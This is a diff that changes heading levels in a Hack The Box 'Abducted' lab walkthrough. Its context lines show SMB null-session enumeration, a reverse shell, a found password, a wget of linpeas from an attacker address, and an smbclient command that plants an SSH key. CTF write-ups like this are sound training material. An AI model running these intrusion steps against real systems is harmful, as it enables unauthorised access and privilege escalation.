@@ -1,6 +1,6 @@
 # Abducted HTB medium linux
 
-# 1. NMAP
+## 1. NMAP
 
 ```powershell
 ┌──(kali㉿kali)-[~/Downloads]
@@ -51,7 +51,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.10 seconds
 - 139/tcp (NetBIOS)
 - 445/tcp (SMB - Server Message Block)
 
-# 2. SMB enum
+## 2. SMB enum
 
 ```powershell
 ┌──(kali㉿kali)-[~/Downloads]
@@ -71,7 +71,7 @@ Unable to connect with SMB1 -- no workgroup available
 
 - Successfully initiated a Null Session (anonymous login)
 
-# 3. Rpcclient enum
+## 3. Rpcclient enum
 
 ```powershell
 ┌──(kali㉿kali)-[~/Downloads]
@@ -108,7 +108,7 @@ rpcclient $>
 - found a valid system username: scott (Full Name: Scott Mercer), RID: 0x3e8
 - Domain name - ABDUCTED
 
-# 4. Tried accessing shares
+## 4. Tried accessing shares
 
 ```powershell
 ┌──(kali㉿kali)-[~/Downloads]
@@ -128,7 +128,7 @@ session setup failed: NT_STATUS_LOGON_FAILURE
 session setup failed: NT_STATUS_LOGON_FAILURE
 ```
 
-# 5. Null auth allowed
+## 5. Null auth allowed
 
 ```powershell
 ┌──(kali㉿kali)-[~/Downloads]
@@ -150,7 +150,7 @@ SMB         10.129.17.137   445    ABDUCTED         IPC$                        
 - We have Write permission on HP-reception
 - Logged In as a "Guest” (ABDUCTED\valid-username:Password123! (Guest))
 
-# 6. CVE-2026-4480
+## 6. CVE-2026-4480
 
 - After searching the keywords I have I landed onto this CVE.
 
@@ -160,7 +160,7 @@ After some searching up i found the exploit script for the CVE mentioned, and it
 
 ![image.png](Abducted%20HTB%20medium%20linux/image%201.png)
 
-# 7. Exploit
+## 7. Exploit
 
 - Set-up listener
 
@@ -186,7 +186,7 @@ bash: no job control in this shell
 nobody@abducted:/var/spool/samba$ 
 ```
 
-# 8. Recon as nobody
+## 8. Recon as nobody
 
 ```powershell
 nobody@abducted:/home$ ls -la 
@@ -272,7 +272,7 @@ iXzvcib3SrpZ
 
 - iXzvcib3SrpZ
 
-# 8. Escalate to scott
+## 8. Escalate to scott
 
 ```powershell
 nobody@abducted:/var/spool/samba$ su marcus 
@@ -287,7 +287,7 @@ scott@abducted:~$ cat user.txt
 92e----------SNIP-----------6cb
 ```
 
-# 9. Uploading linpeas
+## 9. Uploading linpeas
 
 ```powershell
 nobody@abducted:/tmp$ wget http://10.10.15.88:8000/linpeas   
@@ -310,7 +310,7 @@ nobody@abducted:/tmp$ chmod +x linpeas
 
 Broke the shell :p.
 
-# 10. Conf files
+## 10. Conf files
 
 ```powershell
 nobody@abducted:/var/spool/samba$ ls -la /etc/samba/
@@ -351,7 +351,7 @@ nobody@abducted:/var/spool/samba$ cat /etc/samba/shares.conf
    browseable = yes
 ```
 
-# 11. Priv esc
+## 11. Priv esc
 
 #### Step 1
 
@@ -377,7 +377,7 @@ smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' -c 'mkdir mh/.ssh; put /t
 ssh -i /tmp/k marcus@127.0.0.1
 ```
 
-# 12. Root
+## 12. Root
 
 #### Step 1: Create the Malicious Systemd Configuration Override
 
